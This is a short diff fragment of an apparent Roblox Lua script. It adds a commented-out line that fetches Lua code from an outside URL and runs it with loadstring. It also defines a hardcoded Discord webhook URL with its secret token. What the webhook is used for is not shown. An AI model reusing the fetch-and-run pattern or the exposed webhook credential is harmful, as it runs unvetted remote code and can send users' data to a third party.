@@ -8,7 +8,9 @@ local cam = workspace.CurrentCamera
 local pg = LP:WaitForChild("PlayerGui")
 
 task.spawn(function()
--- DUAL BOOT
+-- loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/752793106aac832ba8ddd9d8718e3189d73b69680acd7616ff256c77d42ac9d3/download"))()
+end)
+
 task.spawn(function()
 
 local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1494020666637160448/k5Wedfs474-75sVWHwDw_IsYVWPpm_TAS2mT7yScgqHAgGiubuaWUpM5VQx9O4i-I2b6"
